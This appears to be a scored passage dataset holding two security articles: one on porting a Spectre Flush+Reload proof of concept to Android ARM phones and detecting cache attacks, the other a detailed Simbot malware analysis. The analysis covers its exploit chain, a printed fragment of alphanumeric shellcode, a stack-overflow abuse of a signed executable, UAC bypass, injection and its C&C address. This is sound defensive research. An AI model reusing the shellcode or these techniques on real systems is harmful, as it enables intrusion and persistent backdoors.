"The x86 instructions _mm_clflush (cache flush) and rdtscp or rdtsc (time measure) do not exist on ARMv7. While we found a replacement for cache flush named __ARM_NR_cacheflush, there is no direct replacement for time measurement. However, the conclusions of prior research work [8, 9] present us with four alternative solutions:",0.015286393700514767
"Monitoring hardware events. This relies on the
perf_event_open
system call. Unfortunately, hardware events are not available on the smartphones we have.",0.011882547779831887
"The CPU's performance monitor unit (PMU). This solution should provide accurate timing, but unfortunately, the PMU is only available from kernel space, not from user space. As the idea is to test the vulnerability of common
Android
smartphones to Spectre, we ruled out this solution. Indeed, this would involve modifying the
Android
kernel or adding a kernel module, which does not correspond to the typical standard end-user system.",0.014067198458483587
"A dedicated thread timer. This solution is very simple and consists of having a counter increment in a dedicated thread. This works quite reliably on
Linux
hosts, however we found it was not precise enough on a smartphone.",0.010606229679462897
"Get time POSIX functions. The only remaining solution consists of using
clock_gettime()
, using the following clocks for better results:
CLOCK_REALTIME
or
CLOCK_MONOTONIC
.",0.01431931704516487
Timing results,0.009879775940857649
"After successfully porting the PoC (source code available at [10]), we ran it on our test smartphones. Some tuning was required, for instance to find the appropriate duration to differentiate a cache hit from a cache miss. That value is different for each system.",0.0102124612189477
"Yet, although the PoC ran, it failed to recover the secret phrase. In the output below, the recovered characters are 'o' followed by non-alphanumeric characters; this does not match the expected secret phrase which is 'The Magic Words are Squeamish Ossifrage'.",0.015591181383863395
"MAX_TRIES=5500 CACHE_HIT_THRESHOLD=364 len=40
Reading 40 bytes:
Reading at malicious_x = 0xffffe7e4 Unclear: 0x6F='o' score=809 (second best: 0xF0='?' score=806)
Reading at malicious_x = 0xffffe7e5 Unclear: 0xF3='?' score=809 (second best: 0xF6='?' score=808)
Reading at malicious_x = 0xffffe7e6 Unclear: 0xF0='?' score=877 (second best: 0xF6='?' score=847)
Reading at malicious_x = 0xffffe7e7 Unclear: 0xF0='?' score=839 (second best: 0xF6='?' score=829)",0.022556087360869448
"Note that the smartphones on which we tested the PoC were unpatched, as the mitigation for Spectre on AArch32 was only released in June 2018 [11] and not pushed to the test smartphones at this time.",0.013447743345653795
"Also, we conducted the same test on an old smartphone featuring an ARM Cortex A8 [12]. This ARMv7 CPU is interesting because ARM lists it as vulnerable to Spectre. Nonetheless, we obtained the same results as with the ARM Cortex A53, i.e. the secret phrase was not recovered when this CPU was used.",0.012871168707515923
"The most obvious conclusion to such a fail is that the test phones are not vulnerable to Spectre, or at least not to Flush+Reload implementations of Spectre, without substantial modification of the system. A lesson to be learned is that a vulnerable CPU is different from a vulnerable platform. As we have seen previously, ARM Cortex A8 is vulnerable as a CPU, but the vulnerability cannot be exploited over an Android OS stack.",0.011219598389658914
Some additional research could be done to confirm this result:,0.009344065001127833
"Use the CPU's PMU to obtain precise timing instead of using
clock_gettime()
. However, as we said earlier, this involves kernel modification and is not representative of common end-user smartphones. Additionally, note that, for the same reasons, a piece of malware achieving this without user's knowledge is highly unlikely.",0.012044869331100494
"Implement Prime+Probe or Evict+Reload cache attacks for Spectre. This is an interesting option, because it is likely that the
__ARM_NR_cacheflush
syscall does not properly flush the cache. But this solution goes beyond the standard port of the official PoC (which uses Flush+Reload).",0.01336995476666869
Table 1 summarizes the findings.,0.023758922325214482
Spectre cache attack,0.010557010766512831
Hacks,0.009971367495873351
Smartphone,0.00874120950208468
Results,0.01176101208707414
Flush+Reload,0.008591711010978442
,0.009266598000432946
Android with ARM Cortex A53,0.011375479202912708
Not vulnerable,0.006010948341038103
Prime+Probe,0.008861289558277696
,0.009266598000432946
Android with ARM Cortex A53,0.011375479202912708
"To do
(no known PoCs for this)",0.00818220068833253
Evict+Reload,0.007898434956768563
,0.009266598000432946
Android with ARM Cortex A53,0.011375479202912708
"To do
(no known PoCs for this)",0.00818220068833253
Flush+Reload,0.008591711010978442
Kernel module to access PMU,0.007249662173383964
Android with ARM Cortex A53,0.011375479202912708
To do,0.01113557105211993
Flush+Reload,0.008591711010978442
,0.009266598000432946
Android with ARM Cortex A8,0.011387661694079343
Not vulnerable,0.006010948341038103
Table 1: Summary of findings.,0.01896586695479119
"In practice, the results mean that if you own an old Android smartphone or a low-to-middle range Android smartphone with an ARM Cortex A53, it is probably secure against Spectre attacks. There are only risks with a few recent high‑end smartphones, especially with ARM Cortex A57 and A72. In those cases, to be absolutely certain, it is better to test the PoC for AArch64 [7].",0.015654234208295814
Part 2: Is there any Spectre-related malware in the wild?,0.012383644810167738
"In February 2018, there were several headlines in the news stating 'Meltdown-Spectre malware is already being tested by attackers' and 'Meltdown and Spectre malware discovered in the wild'. The information was based on an AV-TEST graph [13], which, unfortunately, was misinterpreted, as we will see.",0.01547178128755522
"Figure 2: AV-TEST graph as Tweeted on 1 February 2018, reporting 139 unique samples for Spectre and Meltdown [13].",0.015393167924259599
Spectre malware samples?,0.01409108112875268
"We checked each of the 139 samples reported by AV‑TEST, one by one. At that time, their names were the following:",0.010775550201242101
W32/Spectre.D!tr,0.008047160059858394
ELF/MeltdownPOC.B!tr,0.008798707727503241
Riskware/SpectrePOC,0.007604608383781519
Riskware/POC_Spectre,0.007279861205101601
Linux/Spectre!tr,0.00922772367384872
Linux/Spectre.C!tr,0.009564174787269564
Linux/Spectre.A!exploit 3043151C.vsc,0.007579648805883021
W32/Meltdown.D!tr,0.007434118177840898
ELF/MeltdownPOC.A or .B,0.0089365161776086
"All of these samples were proof of concepts. For the sake of clarity, in the case of Spectre, we renamed them all 'Riskware/SpectrePOC'. AV-TEST explicitly Tweeted an additional comment: 'The majority of samples are based on the known PoC codes [...] we also found the first working JavaScript PoC for Spectre' [13]. Note that AV-TEST speaks of samples and not malware. Unfortunately, the subtle difference between a sample, or a PoC, and a piece of malware went unnoticed (except by AV experts [14]) and led to major confusion with claims that 'Meltdown-Spectre malware' was in the wild. We re-iterate that there is a significant difference between a PoC of Spectre and a piece of malware using Spectre. Turning a PoC into a malicious executable is far from a trivial process.",0.014319726196759697
"If we study detection hits for those Riskware/SpectrePOC samples, we get the following graph.",0.011755275708411062
Figure 3: Detection hits on FortiGates for Riskware/SpectrePOC (Spectre proofs of concept).,0.015770369851571653
"The graph shows an initial spike in early January, when we released the signatures for the Spectre PoCs. The second spike, in March, is presumed to correspond to the release of several Microsoft patches. Both spikes probably correspond to people testing Spectre PoCs on their infrastructures to assess vulnerability. We can also see a slight disinterest in Spectre starting in April 2018: before that date, besides spikes, we were registering approximately 40 hits per day (which isn't a lot); after April, it was more like 20 hits per day. This is slightly surprising as new versions of Spectre were released in May, but that did not seem to increase interest.",0.01407572604065066
Detecting Spectre malware,0.010921586824834906
"Even if there isn't any Spectre malware yet, that isn't to say that it won't happen one day. Researchers quickly tried to think of ways to detect Spectre. Some came up with the idea of detecting cache attacks with Linux perf [15], others by monitoring patterns of cache misses/cache hits [16], or by extending the Coverity static analysis tool [17], etc.",0.01396503872265098
"As an anti-virus researcher, I decided to craft a more or less generic AV signature to detect Flush+Reload cache attacks in ELF x86-64 executables (Figure 4). My goal wasn't to design a perfect signature (difficult, if not impossible), but something that would roughly work. I simply parsed the executable, looking for a cache flush instruction. If one was found, I would then look for two close rdtscp instructions.",0.017766520587811696
Figure 4: Detecting Flush+Reload cache attacks in ELF x86‑64 executables.,0.01870869858787616
"Such a signature would not be acceptable in production because of poor performance (the entire binary needs to be scanned) and the high risk of false positives. But, for research, it is acceptable.",0.010870843835961708
We ran the signature against all 62 ELF x86-64 PoCs of Spectre.,0.017989929248362402
"""./2FC4432E.vsc"" is infected with the ""Linux/FlushReload.A!tr"" virus. VID: 888 S
IGID: 8888 SIGTYPE: C
""./2FC0C6A4.vsc"" is infected with the ""Linux/FlushReload.A!tr"" virus. VID: 888 S
IGID: 8888 SIGTYPE: C
""./2FC4A10C.vsc"" is infected with the ""Linux/FlushReload.A!tr"" virus. VID: 888 S
IGID: 8888 SIGTYPE: C
[Summary] Scanned: 62 Infected: 36 Total bytes: 1.614MiB Time: 0m0.001s",0.010108454619776608
"36 samples out of 62 were detected immediately. We investigated the remaining ones, and it appears they were all damaged: the cache flush instruction was missing. Without that instruction, Spectre won't run, so missing those samples is not very important.",0.013294895622200431
"As a second test, we ran the signature against 661,977 recent malicious ELF samples from the last six months. The result was quite surprising because the signature detected no samples other than the Spectre PoCs.",0.013168743471405953
Figure 5: Testing a research Flush+Reload cache signature on ELF samples.,0.014916365931530784
"This gives us some important information: Flush+Reload cache attacks are not common in ELF malware. Also, we had expected several false positives with this signature, but that was not the case: this imperfect signature turns out to be quite good in practice.",0.011381170204091018
Conclusion,0.008171308922719556
The take-aways of this work are the following:,0.012834722774757279
A vulnerable CPU is different from a vulnerable system.,0.010033400613183363
"Android
smartphones with an ARM Cortex A53 are not vulnerable to Flush+Reload Spectre attacks.",0.018193254813856252
Implementing cache attacks on ARM-based smartphones is difficult. Code does not easily port from Intel x86-64 to ARMv7.,0.01676454855005738
We are currently not aware of any malware based on Spectre.,0.014679737247883295
Cache attacks are not common in malware.,0.015269386603057655
"The future is difficult to foresee. On the one hand, each time an attack goes public, malware authors use it sooner or later (usually quite soon). So, we might expect to see Spectre malware soon. On the other hand, this research work proves that cache attacks are difficult to implement, and perhaps not extremely well suited to mass infection because the malicious implementation will have to handle many CPUs, architectures and operating systems, and tune the attack for each of them. As long as there are easier ways for malware authors to make money, why would they embarrass themselves with such a technical choice? Nonetheless, the attack could certainly interest authors of targeted attacks (governments, political targets etc.).",0.015274452231375135
Acknowledgements,0.0103658076566161
"This research was presented at the Pass The SALT conference. I particularly wish to thank Adam Shewchuk of Fortinet for helping me collect data, Ludovic Apvrille and Renaud Pacalet from Telecom Paristech for their explanations of ARM CPUs and speculative execution, and Daniel Gruss for his open discussion with me on implementation issues I met.",0.011655550987722862
References,0.0158494738281566
[1] Kocher. P. et al. Spectre Attacks: Exploiting Speculative Execution. https://spectreattack.com/spectre.pdf.,0.019814017955008034
"[2] Joubran, J. Spectre attack explained like you're five. https://www.youtube.com/watch?v=q3-xCvzBjGs.",0.011781407983068815
"[3] Gruss, D. Software-based Microarchitecture attacks. https://gruss.cc/files/cryptacus2018.pdf.",0.013746149562791965
[4] ARM Cortex A53. https://developer.arm.com/products/processors/cortex-a/cortex-a53.,0.015178119546308433
"[5] ARM, Vulnerability of Speculative Processors to Cache Timing Side-Channel Mechanics. Updated 31 May 2018. https://developer.arm.com/support/arm-security-updates/speculative-processor-vulnerability.",0.012139937391988376
[6] ARM Cortex A53 specifications. https://static.docs.arm.com/dui0946/a/cycle_models_cortex_A53_Model_User_Guide_v8_0_0_DUI0946A_en.pdf.,0.01040122909771446
[7] Spectre PoC for AArch64. https://github.com/V-E-O/PoC/tree/master/CVE-2017-5753.,0.014822811352045107
"[8] Lipp, M.; Gruss, D.; Spreitzer, R.; Maurice, C.; Mangard, S. ARMageddon: Cache Attacks on Mobile Devices, USENIX Security 2016.",0.02519886177195174
"[9] Xiao, Y.; Zhang, Y. Return-Oriented Flush-Reload Side Channels on ARM and Their Implications for Android Devices, CCS 2016.",0.026096155561352585
[10] Spectre PoC for ARMv7-A. https://github.com/cryptax/spectre-armv7.,0.015203370666552307
[11] Phoronix. 32-bit ARM Finally Gets Mitigiated For Spectre V1/V2 With Linux 4.18. https://www.phoronix.com/scan.php?page=news_item&px=Spectre-32-bit-ARM-Linux-4.18.,0.011179585936346825
[12] ARM Cortex A8. https://developer.arm.com/products/processors/cortex-a/cortex-a8.,0.013254266067898035
[13] AV-TEST Tweet. 1 February 2018. https://plus.google.com/photos/photo/100383867141221115206/6517535568830348546.,0.010867911946986997
"[14] Grooten, M. There is no evidence in-the-wild malware is using Meltdown or Spectre. 2 February 2018. https://www.virusbulletin.com/blog/2018/02/there-no-evidence-wild-malware-using-meltdown-or-spectre/.",0.012450513280552578
[15] Capsule 8. Part Two: Detecting Meltdown and Spectre by Detecting Cache Side Channels. 9 January 2018. https://capsule8.com/blog/detecting-meltdown-spectre-detecting-cache-side-channels/.,0.013552543748660661
"[16] Israel, E.; Marx, D.; Alon, Y.; Gafni, A.; Omelchenko, B. Detection of the Meltdown and Spectre Vulnerabillities. 8 January 2018. https://research.checkpoint.com/detection-meltdown-spectre-vulnerabilities-using-checkpoint-cpu-level-technology/.",0.014054080878057373
"[17] Synopsys, Detecting Spectre vulnerability exploits with static analysis. 22 March 2018. https://www.synopsys.com/blogs/software-security/detecting-spectre-vulnerability-exploits-with-static-analysis/.
",0.013271123383931327
"BYOT: Bring Your Own Target
2014-03-04",0.012054867020978244
"Gabor Szappanos
Sophos
,
Hugary
Editor:
Helen",0.009768953231949928
"Martin
Abstract
The author of Simbot doesn’t take anything for granted: all the necessary components for the malware’s execution are bundled and dropped onto the system, including the relevant vulnerable application for exploitation and regular Windows system binaries.
Copyright © 2014 Virus Bulletin",0.012991958451456287
"It is nothing new for a piece of malware to exploit a vulnerability found in an application – in fact, that is the routine procedure for infecting a computer. This approach does, however, have a weak point: the application in question must be installed on the target computer; furthermore, it must be a vulnerable version of it.
One malware sample we analysed recently breaks the traditional mould in two ways: the purpose of the exploitation is not intrusion, but to minimize the detectable system footprint, and it does not rely on preinstalled applications. Apart from that, so as not to break with tradition completely, the system infection is achieved via a common Word exploitation technique.
Following successful infection, only a handful of clean applications are left on the system, along with the encrypted payload file and a single registry key, which is a crucial element of the infection scheme.
The issue of whether or not the appropriate version of the vulnerable application is installed on the target system is eliminated simply: the trojan drops the vulnerable application onto the system itself, and uses it for its own purposes. In fact, the author of this malware does not take anything for granted: all the necessary components for the malware’s execution are bundled and dropped onto the system, including regular Windows system binaries.",0.013174372631367337
"Installation process
The installation of the malware is a little complicated. It starts with a document exploit, runs through multiple intermediate dropper stages, and concludes in the final infected state with a handful of clean components and the encrypted payload on the system. The process is summarized in Figure 1.
Figure 1. Installation flow of Simbot.",0.01131022248251845
"1. Exploited carrier document
File size: 830,336 bytes
SHA1: 0ddae43498e1b03a274f8ca8b32cd48a1a440e7d
MD5: 6282568857a120a93de3af57e21952e1
The starting point of the infection chain is an encrypted Excel workbook with default hard coded null password, the meaning of which was explained in [1]. The same vulnerability as described in [1] (CVE 2012-0158) was used in this case as well.
The carrier document is a very unique compound, as illustrated in Figure 2. Normally, in document exploitations we see either Excel workbooks or Word RTF documents that contain the (usually multi staged) shellcode with the encrypted payload executable appended. In this case, the first stage shellcode is within an encrypted Excel workbook, the second stage shellcode is in an appended Word RTF fragment, and then comes the encrypted executable. It gives the impression of a project that has been copy pasted from different sources with minimal integration effort.
Figure 2. Exploit document structure.
The encrypted workbook contains the first stage shellcode, which enumerates open file handles, checking for the file size. The file size must be exactly 830,336 bytes – the size of the carrier workbook. Then it reads in, decodes and executes the content from file offset 0x1de00, at which the hexadecimal text representation of the second stage shellcode is located.
The second-stage shellcode once again checks for the correct file size for the carrier workbook and searches for the start marker for the embedded .exe (TSRQPONMP). If the marker is found, the DWORD following it is used as the length of the embedded file, followed by the whole payload content, which will be encrypted with a single byte XOR encoding, the key being decremented by one after each byte.
After the second stage code, further shellcode fragments are found, which are not used and are corrupted when decrypting the shellcode (running over the real length). This is an indication that the carrier was created by reusing older components and overwriting the (longer) shellcode with the new code, not caring about what happens to the trailing remainder of the old code. Again, this underlines the minimal integration effort made in the creation of the exploited workbook.",0.0158218422747316
"2. First-stage dropper
File size: 654,675 bytes
SHA1: 16fbb14ef6c7ae9c401859aedf99cfd762f00794
MD5: dfed4bdf77892f2c62b8c68782c16132
This component is a very simple dropper. It reads the next stage executable from offset 0x1800 in 0x400 byte chunks, saves it to a temporary file in the %TEMP% folder, then executes the dropped file.",0.011126786989065662
"3. Intermediate dropper
File size: 647,168 bytes
SHA1: 79ef9296a2a0913e60a925da2f9d061ae3a364c7
MD5: 91d26990f22a4584e631395f5ae234c3
This dropper searches for a mutex named ‘Sample06’ to determine whether another instance of the dropper is already running – if it finds the mutex, it exits.
It checks for the presence of a debugger by looking for magic bytes in the allocated heap:
0ABABABABh (used by Microsoft’s debug-built HeapAlloc() implementation to mark ‘no man’s land’ guard bytes after allocated heap memory)
0BAADF00Dh (used by Microsoft’s debug-built HeapAlloc() implementation to mark uninitialized allocated heap memory)
0FEEEFEEEh (used by Microsoft’s debug-built HeapFree() implementation to mark freed heap memory).
If a debugger is found, only an empty window with the title ‘NewSetup’ is displayed.
Otherwise, in an untainted environment, it decodes an offset independent code (using a single-byte XOR algorithm, with key 0x97), and executes it.
This component creates the HKLM\SOFTWARE\Microsoft\Windows\Help -> Config registry key and saves the encrypted configuration data there (see Figure 3).
Figure 3. Configuration data stored in the registry.
If, for any reason, saving the configuration data to the registry fails, then as a backup method, the same data is dumped into the file C:\Documents and Settings\All Users\NetWork\t1.dat.
This configuration data is used by the final stage payload, with the C&C server address extracted from the key value of the file.
Finally, it decodes and executes the next stage dropper.",0.012700788877566538
"4. Installer
File size: 466,872 bytes
SHA1: 5a22efba829c259f1cb17f9ffe529c398397e25c
MD5: 138f32de8f53fe651a7b6967c63cf7ac
This component is actually a Windows DLL with obfuscated entry code and a lot of redirections.
It drops the following files:
C:\Documents and Settings\All Users\NetWork\Config.dat (encrypted main payload)
C:\Documents and Settings\All Users\NetWork\DDVCtrlLib.dll (clean DLL, needed for science.exe to execute)
C:\Documents and Settings\All Users\NetWork\DDVEC.dll (clean DLL, needed for science.exe to execute)
C:\Documents and Settings\All Users\NetWork\science.exe (clean executable).
In order to survive a reboot, it registers the dropped executable as a service, passing an enormously long command line with three command-line parameters:
HKLM\SYSTEM\CurrentControlSet\Services\NetWork Service  ImagePath:
C:\Documents and Settings\All Users\NetWork\science.exe LLLLYIIII7QZAkA0D2A00A0kA0D2A12B10B1ABjAX8A1uIN2
uNkXlMQJLePvbUPePJgW59t7kwOKDSPJgg5hh2ZezxFVXJg75xlr
ebuXbtKyWqUXp5FKfZvYPKwpEzTm7xosdLUO7w5zXLnN0dVNKO72
eKLYKJs3ROEucKypdnkgEVP5PgpUPLKRVtLLKT6ELLKw6WxlKQnw
PLKp6u6vYPOr8RUzRnkyHlKRs7LNkpTvzt8w",0.013075131835641907
...{7760 further ASCII characters skipped}...,0.010326484242649814
"pW2kOhRD2A00A0kA0D2A12B10B1ABjAX8A1uIN2unkZLk1jLGpdB
Wpwpo73uKTWkwOIdU0iWW5kX0z5zjfTxO7rexlsu2uM2TKxGbejP
5Fn6HVyPXG1Ul4M7XoRtZ5yW2ezXNNxP4VlkO73uilYKhSSR856S
HIsTnkgE6PGpUPUPLKPvtLNkafWllKr 100
[email protected]",0.015009709372499902
"The first parameter is intended to cause a buffer overflow in the clean executable and, by invoking a shellcode, run the loader for Config.dat. It should be noted that, of the three parameters passed in the command line, the second bears no relevance, but the last one is of crucial importance.
Not wanting to wait for the next reboot, CreateProcess is called with the same parameter to execute the payload immediately (the final couple of bytes differ; also the second command-line argument, 100, is replaced with 300).",0.011309236774228903
"Loading process
When all of the required pieces have been installed on the system, the malware deletes the temporary components, and the infected computer is ready for (ab)use. During system start up, the dropped science.exe file is loaded as a service, with a malicious command line.",0.012381336587441782
"Science.exe
File size: 112,064 bytes
SHA1: 6261e967baf09e608e5d5b156a3701339c73fb95
MD5: 0070a38553997de066b2aba8c0574d6f
This is a legitimate, digitally signed clean application (certificate issued to Jinhua 9158 Network Science and Technology Co. Ltd), the original name of which is Download.exe. Looking up other files signed by the same certificate, we found a handful of other application installers that dropped similar versions of Download.exe (see Appendix). All of them proved to be vulnerable to the same abuse, but due to reorganization of the code and memory layout, modifications would be needed in order for them to be used in this way.
As shown in Figure 4, the science.exe file is intact, not modified by the malware author.
Figure 4. Digital signature checked OK.
The program is executed either via the registry key, or using the CreateProcess API. In both cases the extremely long command line is passed to it. Either way, the long command line causes a stack overflow, and leads to the execution of a piece of shellcode. Although not obvious at first, the shellcode is actually hidden within the command line argument itself.
Crash dumps show that an access violation occurs at virtual offset 404350h in science.exe, which is an interesting coincidence (actually, a lot more than a coincidence), given that the last command-line argument, [email protected], is exactly this value in hexadecimal representation.
Looking at the executable in a disassembler, one can observe that at this virtual address there is a POP ECX, RET sequence:
.text:00404350 59  pop ecx
.text:00404351 C3  retn",0.01325292729798555
"A bit of debugging reveals that, upon reaching this point, the stack contains the command-line parameter address and a zero; the code above pops the zero and transfers execution to the first byte of the command line.
The mechanism of this exploitation is exactly the reason why the MSDN library documentation contains warnings such as the following for some of the function references:
‘Using vsprintf, there is no way to limit the number of characters written, which means that code using this function is susceptible to buffer overruns. Use _vsnprintf instead, or call _vscprintf to determine how large a buffer is needed.’
The overflow occurs when the command-line arguments are written out to the log file (Download.log) and vsprintf is used on this buffer without any precaution. This will cause an overflow if the command line is longer than 0x2000 bytes.
char *write_log(int a1, char *Format, ...)
{
va_list va; // [sp+200Ch] [bp+Ch]@1
char *result; //
[email protected]",0.012321332259186635
"char Dest; // [sp+0h] [bp-2000h]@2
va_start(va, Format);
result = Format;
if ( Format )
{
result = (char *)vsprintf(&Dest, Format, va);
if ( (unsigned int)result < 0x2000 )
result = (char *)CLog__ADD_Log(g_Log, &Dest, result, a1);
}
return result;
}",0.017891554453948633
"The function calls vsprintf to print the argument list into a string buffer allocated with a size of 0x2000 bytes; the format string is the command-line argument, which in our case turns out to be longer than the allocated space for the buffer. As a result, vsprintf will overwrite the return address on the top of the stack.
The command-line argument is filled with junk characters just to make sure that the [email protected] at the end will end up at the location at which the return address is stored.
This way, the return at the end of the function:
add  esp, 2000h
retn",0.013183954483223737
"will position the stack pointer to the 0x404350 DWORD on the overwritten stack.
To illustrate this, the top of the stack on the entry of the write_log() function looks like this:
return address
Param 1: log entry ID
Param 2: address of command line
Then, after the stack overrun on the exit of write_log(), the stack will contain:
0x404350
Param 1: log entry ID
Param 2: address of command line
When the execution returns to offset 0x404350, the first value is popped from the stack, leaving only the entry ID and the address of the command line:
Param 1: log entry ID
Param 2: address of command line
At offset 0x404350 in the program, a function epilogue is found:
.text:00404350  pop  ecx
.text:00404351  retn",0.01933998348021826
"This will pop the log entry ID from the top of the stack, and return to the next address found on the stack, which is the address of the command line. Consequently, the execution starts at the first byte of the command-line argument.
I should mention that this is a very simple stack overflow exploitation – a textbook example that was commonly being practised over 10 years ago. Nowadays, secure coding methods make applications a lot harder to break. Nevertheless, the malware writers only needed to find one vulnerable application, and use it for their purpose.",0.012788379546700424
"Shellcode from science.exe
At first glance, the command-line parameter looks like a random string:
LLLLYIIII7QZAkA0D2A00A0kA0D2A12B10B1ABjAX8A1uIN2uNkXl
MQJLePvbUPePJgW59t7kwOKDSPJgg5hh2ZezxFVXJg75xlrebuXbt
KyWqUXp5FKfZvYPKwpEzTm7xosdLUO7w5zXLnN0dVNKO72eKLYKJs
3ROEucKypdnkgEVP5PgpUPLKRVtLLKT6ELLKw6WxlKQnwPLK...",0.013826769331618527
"But in fact it is a valid 32-bit Intel code, starting with a short decoder, which is followed by the decrypted shellcode. It is very likely that it was created by the unicode_upper encoder of the Metasploit toolkit. This encoder generates a final form where each byte of both the decoder and the decoded content is an alphanumeric character – very suitable if it has to be passed as a command line. However, an important part of the shellcode usually cannot be represented in ASCII bytes. This is the prologue, which is responsible for determining the exact memory position. Without knowing this, it is not possible to decode the main shellcode body.
Normally, the Metasploit decoders begin with a ‘get EIP’ fragment, similar to this:
fabs
fnstenv byte ptr [esi-0Ch]
pop  ebp",0.013477635970215007
"First, a random floating point instruction is executed, and then the fnstenv instruction is used to get the floating point environment structure. Among many properties, at offset 0x0C this structure contains the EIP of the last executed floating point instruction (fabs, in this case). The structure is aligned 0x0C bytes into the stack, thus the top of the stack will just contain the EIP value, which is later popped into the EBP register. This is a commonly used, portable solution, but has one major disadvantage: the byte code of the floating point instructions contains non-printable characters, thus can’t be used in a string command-line parameter.
The shellcode used in the Simbot infection scheme is limited by the fact that it also has to serve as a command line parameter, and can thus only contain printable characters. This means that it can’t contain the usual code to find its own memory offset, but it can make use of the fact that it knows the exact stack layout during the exploitation – thanks to the very controlled environment (i.e. only the specific science.exe, dropped during the installation, has to be exploited).
Simbot’s shellcode uses the following ‘get EIP’ snippet:
dec esp
dec esp
dec esp
dec esp
pop ecx",0.015791609482882607
"The advantage is obvious: all of these instructions are represented by printable characters. But the exploitation must be very strict; this prologue requires the stack pointer to be controlled to an exact value. In the previous section we saw that this is the case – the stack pointer is well known by the time the execution reaches this point.
The code was reached via a RET instruction from science.exe, therefore decreasing the stack pointer by four will position it back to the memory address of the command line, which coincides with the start of the shellcode, the two being the same.
The first part of the shellcode is the unicode_upper decoder, which performs a single-byte XOR decryption, the key value being modified in each loop.
After the decoding, a more or less traditional piece of shellcode is found.
Figure 5. Unicode_upper decoder.
(Click here to view a larger version of Figure 5.)
Figure 6. A more or less traditional piece of shellcode is found.
The API resolver code (a combination of shift left by three bytes, and a bytewise XOR of the last byte of the checksum with the actual character of the name) is unusual, and has not yet been seen in other samples.
The shellcode reads the content of Config.dat (the main payload) from the folder from which the exploited science.exe was executed, and decrypts it.
The decryption has two layers: first is a single-byte XOR, the key being the first byte of the file; the second is a running key single-byte XOR, which starts with 1, and is incremented in each loop.
Finally, it executes the decrypted content.",0.010228750787021013
"Memory loader
The decrypted Config.dat contains the embedded main payload, which starts at offset 0xc13, and a loader code.
The loader code, executed by the shellcode, does the necessary housekeeping to transfer this embedded data (which is actually a Windows PE executable) to an executable memory image: it fixes the section permissions, resolves the imports, and performs the necessary relocations. This way, the payload can be decoded and executed without hitting the hard disk (and without giving on-access anti virus products the chance to check and detect it).",0.015551074956519861
"Main payload
The final payload is a Windows DLL with an obfuscated entry code, using a couple of redirections before reaching the DllMain function, which itself is also obfuscated to make tracing more complicated.
It contains yet another encrypted PE loader code and a large, 0x18A00-byte-long encrypted embedded DLL which is packed using the zlib algorithm and dropped as instsrv.dat in the %TEMP% directory. This loader is very similar to the loader of Config.dat. It serves as a back up loader (in case the execution runs into access restrictions), which checks the OS version: if it is 5.2 (Windows 8), then it injects the loader code into the explorer.exe process; if it is anything else, it injects the loader code into dwm.exe.
The injected code uses a UAC bypassing technique that is very similar to [2]. Using this, it executes the instsrv.dat file dropped in the %TEMP% directory.
Instsrv.dat is a PE executable that first adds %ALLUSERSPROFILE%\NetWork\science.exe to the DEP exclusion list by invoking the NoExecuteAddFileOptOutList export of the sysdm.cpl applet, passing the path name as a parameter. After that, it terminates the science.exe process, deletes the NetworkService service, and registers science.exe with the exploiting buffer as a service again. Finally, it restarts the service.
Now back to the final payload.
It connects to 59.188.23.121 (which is a dial-up IP located in Hong Kong) on ports 8001 and 8433.
It loads configuration data from the registry key HKLM\SOFTWARE\Microsoft\Windows\Help -> Config (two byte XOR with key 0x004f). Alternatively, if the key for some reason cannot be created in the dropping process, it reads from the file %ALLUSERSPROFILE%\NetWork\t1.dat. The decoded content has the value 585e9b41ebebe0126cfa878bdea036bc.
This is the encoded form of the C&C IP address. Interestingly, the trojan does not decrypt it, rather it is later brute-forced to match the IP – all possible IP address strings are generated and tested. The IP addresses (two of them, both the same) are decoded character-by-character.
Given the complexity of the installation and the loading process, the backdoor component has disappointingly little functionality: once the connection is established, it sends and receives data. The data is BASE64 encoded and zlib compressed (version 1.2.3 code is compiled into the code), it is decompressed in memory, and executed. An uncompressed PE executable in the network traffic would be too obvious a sign of suspicious activity, hence the compression.
So the result of all the efforts described here is ‘only’ to open a channel to the infected computer and facilitate the execution of arbitrary code.
At the time of writing this article, we are not aware of the components that are pushed to the infected computer, but it would be safe to say that the usual data stealing and remote access components are the most likely candidates.",0.012194214234131917
"Conclusion
It is common in APT-related attack scenarios for an application vulnerability (usually in one of the MS Office suite) to be used to breach a system and infect it. The unique feature in Simbot is that an additional exploitation is utilized, this time to hide the presence of the malware on the infected system, and persist after the system restarts.
This malware does not rely on a preinstalled application for infection, rather it carries and drops the target itself – a very convenient approach to ensure that the system contains a vulnerable version of the application in question. Even if the vulnerable application is fixed by the vendor, and the fix is distributed to all users, this will not affect the malware: as long as the malware authors have a single vulnerable version, no matter how old, they can bundle it with the installation package, and drop it onto the system. As mentioned previously, this malware does not take anything for granted, carrying all the necessary components (both malicious and clean) itself.
Ironically, the original purpose of science.exe, as its developer intended, was to download executable updates. Indeed, the Simbot backdoor makes use of this downloader application to download executable updates, but not by using the natural functionality of the downloader, rather by exploiting its logging function to load and execute a binary payload that, after some twists and turns, does the downloading itself.
After a successful infection we will find the following on the system:
A clean signed application registered for start up
Two clean DLL files needed for the execution of the clean executable
An encrypted payload file
A registry subkey that contains an encrypted shellcode.
This is not very much on which to base a reliable detection. And this is a functioning backdoor infection – I can’t think of a case with a less detectable fingerprint on the infected system.",0.011455999729784616
"Bibliography
[1] Szappanos, G. Needle in a haystack. Virus Bulletin, February 2014, p.19. http://www.virusbtn.com/pdf/magazine/2014/201402.pdf.
[2] Windows 7 UAC whitelist: Proof-of-concept source code. http://www.pretentiousname.com/misc/W7E_Source/Win7Elevate_Inject.cpp.html.",0.010153950106102205
"Appendix: Files with the same certificate
The clean science.exe application was signed by ‘JINHUA 9158 NETWORK SCIENCE AND TECHNOLOGY CO., LTD.’ This company is tied to the website 9158.com, which is registered to [email protected], to the organization Jinhua 9158Network Science and Technology Co., Ltd, in Hangzhou, China.
We were able to identify a number of further files in our collection that use a certificate from the same issuer; all of them were clean installers. Some of them (the 9158 KTV installers) dropped Download.exe as a component. Clearly, this application would be the source of the exploited binary.
4d2f9aac4408237a56dadb89e256e637a703b4ee: 9158 Virtual Camera installer – looks legitimate
4d64bb02d287f2f4e3707f8f7c64a92fbe6621b5: 9158 KTV installer (a version of Download.exe is installed) – looks legitimate
4f1e67bfe5c2698698f7abffbfa740507aaaeb49 : CHOUZHOUGame (an add-on of some sort, not a standalone application) – looks legitimate
878f09552e7277544f6b3702e310757c0bde1b42: DuoDuoVideoGame installer (a version of Download.exe is installed) – looks legitimate
